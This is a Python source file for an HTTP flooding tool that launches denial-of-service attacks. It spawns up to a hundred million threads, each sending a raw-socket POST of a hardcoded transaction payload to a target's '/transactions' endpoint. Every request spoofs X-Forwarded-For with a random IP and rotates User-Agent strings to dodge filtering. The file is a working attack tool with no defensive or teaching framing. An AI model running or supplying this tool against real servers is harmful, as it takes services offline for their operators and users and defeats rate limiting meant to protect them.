# -*- coding: utf-8 -*-

import random
import socket
import string
import sys
import threading
import time
from fake_useragent import UserAgent
import ipaddress
import urllib.parse
import argparse

# Setup User Agent and IP pool
ua = UserAgent()
ip_pool = [str(ip) for ip in ipaddress.IPv4Network('192.168.0.0/16')]

# Parse command line arguments
parser = argparse.ArgumentParser(description='HTTP Flooding Tool with POST requests')
parser.add_argument('host', help='Target host (e.g., example.com)')
parser.add_argument('port', type=int, nargs='?', default=80, help='Target port (default: 80)')
parser.add_argument('requests', type=int, nargs='?', default=100000000, help='Number of requests (default: 100000000)')
parser.add_argument('--debug', action='store_true', help='Enable debug mode to show server responses')
parser.add_argument('--test', action='store_true', help='Test mode: Send only one request and show response')

args = parser.parse_args()

# Sample transaction XDR for testing
# This is a hardcoded fake transaction XDR for testing purposes
SAMPLE_XDR = "AAAAANmZ6P1e1FBQnMIbcLI8teFfJnNYiR9duSgq2O5U9qDVAAAAZABR9BsAAAADAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAoVnLrNDgEZ9MjZj2HMp1PhbvKYNQWvPT7Gy6jQkVz0gAAAAAAAAAAACYloAAAAAAAAAAATqDVQAAAEChb5mh2yGqoHgEioEQ93P17T97L3w1zajHkaiiEk5uWp9qLbfLToVXgdT4HxcnpFizGggj2xgmbUzLGGMwCvYH"

# Convert FQDN to IP
host = args.host.replace("https://", "").replace("http://", "").replace("www.", "")
try:
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print(" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()

# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    # print the output on the same line
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# Perform the request
def attack():
    if not args.test:
        print_status()
    url_path = "/transactions"  # Fixed path for transaction endpoint

    # Prepare POST data
    post_data = urllib.parse.urlencode({"tx": SAMPLE_XDR})
    content_length = len(post_data)

    headers = [
        f"X-Forwarded-For: {random.choice(ip_pool)}",
        f"User-Agent: {ua.random}",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: keep-alive",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {content_length}"
    ]
    
    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, args.port))
        
        # Changed from GET to POST request
        request = (
                f"POST {url_path} HTTP/1.1\r\n" +
                f"Host: {host}\r\n" +
                "\r\n".join(headers) +
                "\r\n\r\n" +
                post_data
        ).encode()
        
        dos.send(request)
        
        # If debug mode is enabled, receive and display the response
        if args.debug or args.test:
            dos.settimeout(5)  # Set timeout for receiving response
            chunks = []
            
            try:
                while True:
                    chunk = dos.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    # In test mode, print chunks as they arrive
                    if args.test:
                        print(f"Received chunk: {chunk.decode('utf-8', errors='replace')}")
                        
                response = b''.join(chunks).decode('utf-8', errors='replace')
                
                # In debug mode (not test mode), only print short response info
                if args.debug and not args.test:
                    response_lines = response.split('\r\n')
                    status_line = response_lines[0] if response_lines else "No status line"
                    print(f"\nResponse: {status_line}")
                    
                # In test mode, print full formatted response
                if args.test:
                    print("\n===== FULL RESPONSE =====")
                    print(response)
                    print("=========================\n")
            except socket.timeout:
                if args.test:
                    print("Socket timeout while waiting for response")
            except Exception as e:
                if args.test:
                    print(f"Error receiving response: {e}")
                
    except socket.error as e:
        print(f"\n [ No connection, server may be down ]: {str(e)}")
    finally:
        # Close our socket gracefully
        try:
            dos.shutdown(socket.SHUT_RDWR)
        except:
            pass
        dos.close()

print(f"[#] Attack started on {host} ({ip} ) || Port: {str(args.port)}")
if args.test:
    print("[#] TEST MODE: Sending single request and showing response")
    attack()
    sys.exit(0)
else:
    print(f"[#] Sending {args.requests} requests")
    if args.debug:
        print("[#] DEBUG MODE: Some responses will be shown")

# Spawn a thread per request
all_threads = []
for i in range(args.requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.0001)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
